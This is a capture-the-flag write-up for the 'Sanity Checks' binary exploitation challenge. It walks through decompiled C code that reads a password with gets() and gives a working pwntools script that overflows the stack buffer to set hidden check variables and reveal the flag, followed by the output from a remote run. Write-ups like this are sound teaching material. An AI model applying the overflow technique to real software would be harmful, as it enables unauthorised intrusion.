# Sanity Checks
**Category: Binary Exploitation**

Executing this program gives a prompt asking for a password:

```
$ ./checks
Enter the secret word: secret
Login failed!
```

Let's take a look at the decompiled code to see what we are dealing with:

```c
void main(void)

{
  int iVar1;
  char local_e8 [128];
  char local_68 [64];
  FILE *local_28;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  local_c = 0;
  local_10 = 0;
  local_14 = 0;
  local_18 = 0;
  local_1c = 0;
  printf("Enter the secret word: ");
  gets(local_68);
  iVar1 = strcmp(local_68,"password123");
  if (iVar1 == 0) {
    puts("Logged in! Let\'s just do some quick checks to make sure everything\'s in order...");
    if ((((local_c == 0x32) && (local_10 == 0x37)) && (local_14 == 0xf5)) &&
       ((local_18 == 0x3d && (local_1c == 0x11)))) {
      local_28 = fopen("flag.txt","r");
      if (local_28 == (FILE *)0x0) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      fgets(local_e8,0x80,local_28);
      printf(local_e8);
    }
    else {
      puts("Nope, something seems off.");
    }
  }
  else {
    puts("Login failed!");
  }
  return;
}
```

Some things to note:
1. The password is `password123`
1. Not only must we set the right password, but we need `local_c`, `local_10`, `local_14`, `local_18`, and `local_1c` all to be set to specific values to display the flag. We don't directly control the values these variables have.
1. The variable that holds our password input is read with the `gets` function, which is vulnerable to buffer overflow.

I built out the following program to get the flag:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./checks')

if args.REMOTE:
    io = remote('shell.actf.co', 21303)
else:
    io = process(binary.path)

PASSWORD = 'password123\0'

log.info(io.recvuntil(': '))

PAYLOAD = [
    PASSWORD + 'A' * (64 - len(PASSWORD)), # local_68
    'B' * 12,
    p32(0x11), # local_1c
    p32(0x3d), # local_18
    p32(0xf5), # local_14
    p32(0x37), # local_10
    p32(0x32) # local_c
]

print(flat(*PAYLOAD))
io.sendline(flat(*PAYLOAD))
io.stream()
```

To explain the payload:
1. Strings in C are null terminated. Using the `\0` at the end of our password will make the `strcmp` check stop processing the extra characters we injected after the password.
1. `0x68` - `0x1c` = `76` characters that we have to write before we start overwriting these int values. This is why we write `12` `B` characters after our initial `64` `A` characters.
1. We set the integer checks to the necessary values.

```
$ ./exploit.py REMOTE
[+] Opening connection to shell.actf.co on port 21303: Done
[*] Enter the secret word:
b'password123\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBB\x11\x00\x00\x00=\x00\x00\x00\xf5\x00\x00\x007\x00\x00\x002\x00\x00\x00'
Logged in! Let's just do some quick checks to make sure everything's in order...
actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}
```
